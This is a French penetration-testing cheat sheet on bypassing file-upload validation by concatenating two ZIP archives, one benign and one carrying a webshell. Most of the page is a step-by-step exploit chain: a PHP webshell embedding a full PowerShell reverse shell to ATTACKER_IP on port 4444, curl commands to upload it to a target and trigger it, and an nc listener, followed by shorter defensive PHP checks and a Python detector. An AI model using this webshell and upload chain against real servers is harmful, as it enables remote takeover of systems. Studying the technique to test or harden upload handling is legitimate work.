# Stacked ZIP Archives

### <mark style="color:red;">File Upload - Stacked ZIP Archives</mark>&#x20;

#### <mark style="color:green;">📋 Description</mark>

Exploitation des différences de parsing entre outils lors de la lecture de **deux archives ZIP concaténées**. Si le serveur valide le premier ZIP mais extrait le second, on peut bypass les restrictions.

#### <mark style="color:green;">🎯 Prérequis</mark>

* Upload de fichiers ZIP accepté
* Validation du contenu ZIP côté serveur
* Extraction automatique des fichiers

#### <mark style="color:green;">🔍 Principe technique</mark>

**Comportement des parsers**

```
Fichier : [ZIP1: legit.pdf] + [ZIP2: shell.php]
                ↓                      ↓
PHP/unzip lit  : legit.pdf (premier ZIP)
Windows extrait: shell.php (dernier ZIP)
```

**Différence clé :**

* `unzip -l` : affiche le **dernier** ZIP
* `ZipArchive` (PHP) : lit le **premier** ZIP

#### <mark style="color:green;">⚔️ Exploitation</mark>

**Étape 1 : Créer un ZIP légitime**

```bash
# Créer un PDF valide
echo "%PDF-1.4
Fake PDF content" > legit.pdf

# Créer le premier ZIP (qui passera la validation)
zip benign.zip legit.pdf
```

**Étape 2 : Créer le ZIP malveillant**

```bash
# Créer un webshell PHP
cat > shell.php << 'EOF'
<?php
shell_exec("powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()\"");
?>
EOF

# Créer le second ZIP
mkdir malicious_files
mv shell.php malicious_files/
zip -r malicious.zip malicious_files/
```

**Étape 3 : Combiner les ZIPs**

```bash
# Concaténer les deux archives
cat benign.zip malicious.zip > combined.zip

# Vérification
ls -lh combined.zip
# Doit être la somme des deux tailles
```

**Étape 4 : Test local**

```bash
# Test avec unzip (voit le second ZIP)
unzip -l combined.zip
# Archive:  combined.zip
# warning [combined.zip]:  165 extra bytes at beginning
#   Length      Date    Time    Name
# ---------  ---------- -----   ----
#         X  2025-XX-XX XX:XX   malicious_files/shell.php

# Test avec PHP (voit le premier ZIP)
php -r '$z = new ZipArchive(); $z->open("combined.zip"); echo $z->getNameIndex(0);'
# Output: legit.pdf
```

**Étape 5 : Upload et exploitation**

```bash
# Upload du ZIP combiné
curl -X POST -F "file=@combined.zip" http://target.com/upload.php?s_id=1

# Le serveur PHP valide legit.pdf
# Mais Windows extrait shell.php !

# Démarrer un listener
nc -lvnp 4444

# Accéder au webshell pour trigger le reverse shell
curl "http://target.com/uploads/HASH/malicious_files/shell.php"
```

#### <mark style="color:green;">🧪 Variantes avancées</mark>

**Variante 1 : Triple stacking**

```bash
# ZIP1: validation.pdf
# ZIP2: decoy.txt  
# ZIP3: shell.php

cat zip1.zip zip2.zip zip3.zip > triple.zip
```

**Variante 2 : Nested stacks**

```bash
# Créer une structure imbriquée
zip outer.zip combined.zip
# Le serveur peut extraire récursivement
```

**Variante 3 : Mixed avec null byte**

```bash
# Combiner les deux techniques
# ZIP1 : legit.pdf
# ZIP2 : shell.php\x00.pdf
```

#### 🔬 Analyse technique détaillée

**Structure d'un ZIP**

```
[Local file header 1]
[File data 1]
[Local file header 2]  
[File data 2]
[Central directory header 1]
[Central directory header 2]
[End of central directory record]
```

**ZIP concaténé**

```
[ZIP 1 complet]
[ZIP 2 complet]
       ↓
Certains parsers cherchent la signature PK (0x504B) depuis le début
D'autres cherchent depuis la fin (End of Central Directory)
```

#### <mark style="color:green;">⚠️ Points critiques</mark>

* La taille des ZIPs doit être raisonnable (pas > max upload)
* Le premier ZIP doit passer TOUTES les validations
* Tester localement avant l'upload réel
* Monitorer les logs du serveur pour les erreurs

#### <mark style="color:green;">🛡️ Détection/Prévention</mark>

**Côté serveur (PHP)**

```php
// Validation stricte de la structure ZIP
function validateZipStructure($zipPath) {
    $zip = new ZipArchive();
    
    // Vérifier l'intégrité
    if ($zip->open($zipPath, ZipArchive::CHECKCONS) !== TRUE) {
        return false;
    }
    
    // Vérifier qu'il n'y a qu'une seule structure ZIP
    $fileSize = filesize($zipPath);
    $zip->close();
    
    // Relire pour vérifier la taille des données
    $handle = fopen($zipPath, 'rb');
    fseek($handle, 0, SEEK_END);
    $pos = ftell($handle);
    
    // Chercher la signature End of Central Directory
    $eocdr_signature = pack('V', 0x06054b50);
    $found = false;
    $offset = 0;
    
    for ($i = 0; $i < $pos; $i++) {
        fseek($handle, -($i + 22), SEEK_END);
        $data = fread($handle, 4);
        if ($data === $eocdr_signature) {
            $offset = $pos - $i - 22;
            break;
        }
    }
    
    fclose($handle);
    
    // Si des données existent avant le premier ZIP, c'est suspect
    if ($offset > 100) { // Tolérance de 100 bytes pour les headers
        return false;
    }
    
    return true;
}

// Utilisation
if (!validateZipStructure($_FILES['file']['tmp_name'])) {
    die('Invalid or corrupted ZIP file');
}
```

**Protection additionnelle**

```php
// Extraire dans un dossier temporaire et scanner
$tempDir = sys_get_temp_dir() . '/' . bin2hex(random_bytes(8));
mkdir($tempDir);

$zip = new ZipArchive();
$zip->open($_FILES['file']['tmp_name']);
$zip->extractTo($tempDir);

// Vérifier CHAQUE fichier extrait
$iterator = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($tempDir)
);

foreach ($iterator as $file) {
    if ($file->isFile()) {
        $ext = pathinfo($file, PATHINFO_EXTENSION);
        $mime = mime_content_type($file);
        
        // Whitelist stricte
        if (!in_array($ext, ['pdf', 'docx']) || 
            !in_array($mime, ['application/pdf', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'])) {
            // Nettoyer et rejeter
            rrmdir($tempDir);
            die('Unauthorized file type detected in archive');
        }
    }
}

// Si tout est bon, déplacer les fichiers
// Sinon, supprimer tempDir
```

#### <mark style="color:green;">📊 Outils de test</mark>

```bash
# Analyser la structure d'un ZIP
zipinfo -v file.zip

# Vérifier l'intégrité
zip -T file.zip

# Extraire avec logging verbose
unzip -v file.zip

# Script Python pour détecter les stacked ZIPs
python3 << 'EOF'
import sys

def find_zip_signatures(filename):
    with open(filename, 'rb') as f:
        data = f.read()
    
    # Signature PK\x03\x04 (local file header)
    sig = b'PK\x03\x04'
    positions = []
    start = 0
    
    while True:
        pos = data.find(sig, start)
        if pos == -1:
            break
        positions.append(pos)
        start = pos + 1
    
    return positions

positions = find_zip_signatures(sys.argv[1])
print(f"Found {len(positions)} ZIP signatures at positions: {positions}")

if len(positions) > 1:
    print("⚠️  WARNING: Multiple ZIP structures detected!")
EOF
```

#### 📚 Références

* [ZIP File Format Specification](https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT)
* [PortSwigger - File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
* [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
